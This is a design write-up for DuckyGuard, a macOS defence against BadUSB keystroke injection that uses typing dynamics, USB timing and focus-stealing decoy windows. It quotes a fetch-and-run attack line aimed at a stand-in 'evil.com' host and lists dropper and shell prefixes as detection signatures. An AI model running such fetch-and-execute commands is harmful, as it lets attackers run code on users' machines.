# DuckyGuard Engineering & Architecture Deep Dive

This document details the inner workings of DuckyGuard. Use this guide to understand the underlying operating system concepts, detection algorithms, and defense mechanisms.

---

## 1. The Core Problem: The OS Implicit Trust Model

Operating systems (macOS, Windows, Linux) inherently **trust Human Interface Devices (HID)**. When a USB keyboard is plugged into a computer:
- The OS kernel queries the device's USB descriptors via the Host Controller (`AppleUSBXHCI` on Apple Silicon).
- The microcontroller (e.g., Flipper Zero, ATmega32u4, Raspberry Pi Pico) identifies itself as a standard USB Keyboard (`bInterfaceClass = 0x03`, `bInterfaceSubClass = 0x01`, `bInterfaceProtocol = 0x01`).
- The kernel loads the generic HID keyboard driver and immediately starts routing keystroke scan-codes into the system event stream.
- **Traditional EDR / Antivirus Blindspot**: Antivirus engines monitor process spawns, file system writes, and memory injections. By the time an EDR tool sees `Terminal` open and run `curl ... | bash`, the attacker's payload has already executed with the privileges of the logged-in user.

DuckyGuard solves this by intercepting the attack at the **input and window management layer** *before* the terminal command executes.

---

## 2. Detection Algorithm: Multi-Factor Keystroke Dynamics

DuckyGuard avoids false positives on fast human typists while catching synthetic microcontroller injection using four correlated signals:

```
┌────────────────────────────────────────────────────────────────────────┐
│                        Confidence Scoring Model                        │
│                                                                        │
│   Score = S_velocity + S_jitter + S_usb_correlation + S_pattern        │
│   (Trigger threshold: Confidence ≥ 0.70)                               │
└────────────────────────────────────────────────────────────────────────┘
```

### A. Keystroke Velocity ($S_{velocity}$)
- **Human Typing**: Even world-record typists (160–200 WPM) type at approximately 13 to 16 characters per second (cps) in brief bursts.
- **Microcontroller Injection**: Rubber Duckies, Flipper Zero, and BadUSB microcontrollers type between **40 and 120 cps** (10–25ms intervals between USB HID reports).
- **Metric**: Measured across a rolling window ($N = 12$ keys):
  $$\text{CPS} = \frac{N - 1}{t_N - t_1}$$

### B. Inter-Keystroke Interval (IKI) Jitter ($S_{jitter}$)
- **Biomechanics**: Human typing has natural biometric rhythm variance. The delay between hitting `t` and `h` in "the" is drastically different from hitting `q` and `z`. Human IKI standard deviation ($\sigma$) is almost always $\ge 35\text{ms}$.
- **Synthetic Microcontroller**: Firmware loops (like Arduino `Keyboard.print()` or Flipper BadUSB) fire with identical delays between reports (`delay(12)`). Synthetic $\sigma$ is typically $< 4\text{ms}$.
- **Metric**: Standard deviation of the intervals:
  $$\sigma = \sqrt{\frac{1}{N-1} \sum_{i=1}^{N} (\Delta t_i - \mu)^2}$$
  If $\sigma < 12\text{ms}$ while velocity is high, confidence surges.

### C. Temporal USB Device Correlation ($S_{usb}$)
- DuckyGuard's `USBDeviceWatcher` runs in a background thread monitoring `ioreg -r -c IOHIDDevice`.
- When a new physical USB HID device is plugged in, its arrival timestamp $T_{usb}$ is recorded.
- If an abnormal typing burst begins within $\Delta t \le 5\text{s}$ of a new keyboard attachment, DuckyGuard adds **+0.35** to the confidence score.

### D. Payload Signature Pre-Matching ($S_{pattern}$)
- BadUSB attacks nearly always begin with a predictable sequence:
  - GUI Launcher shortcut (`Cmd+Space` for Spotlight, `Win+R` for Run dialog).
  - Shell or dropper prefix: `curl -sL`, `wget http`, `powershell -enc`, `base64 -d`, `/dev/tcp`.
- Matching any of these pre-signatures in the first 12 characters adds **+0.25** to the threat score.

---

## 3. Active Defense: The Decoy Focus-Stealing Sink

Why does the Decoy Sink work so effectively against BadUSB?

1. **Window Server Focus Hijacking**:
   - macOS uses the **WindowServer** to route hardware keyboard events to the `keyWindow` (the active application with keyboard focus).
   - When a BadUSB launches Spotlight or Terminal, it expects that application to remain in focus to receive the payload.
2. **Instant Focus Preemption**:
   - Within 150ms of the first abnormal keystrokes (well before the attacker can finish typing the command or press `Return`), DuckyGuard launches a topmost window:
     ```python
     self.root.attributes("-topmost", True)
     self.root.lift()
     self.root.focus_force()
     ```
3. **Quarantine & Sinking**:
   - The remaining keystrokes of the attack (e.g. `curl -sL https://evil.com/mal.sh && bash\n`) land safely inside DuckyGuard's sandboxed text buffer.
   - When the simulated `Return` key arrives, it is processed inside DuckyGuard's text area — **not in Terminal or Spotlight**. Zero commands execute on the operating system.

---

## 4. Forensic Threat Triage & YARA Generation

Once the injection stops (3.5 seconds of silence from the keyboard):

1. **Indicator Extraction (IOCs)**:
   - Regex engines extract external domains, IPv4 addresses, and file drop targets.
2. **De-obfuscation**:
   - Base64 blobs (common in PowerShell or encoded bash attacks) are extracted and decoded on the fly.
3. **MITRE ATT&CK Mapping**:
   - `T1200`: Hardware Additions (Physical USB device)
   - `T1059.004`: Unix Shell (bash/zsh)
   - `T1105`: Ingress Tool Transfer (curl/wget dropper)
   - `T1071.001`: Web Protocols (C2 traffic)
4. **Automated Defense Signatures**:
   - DuckyGuard automatically compiles a custom **YARA rule** matching the IOCs and distinctive subcommands, ready for security operations teams to deploy across endpoint fleets.
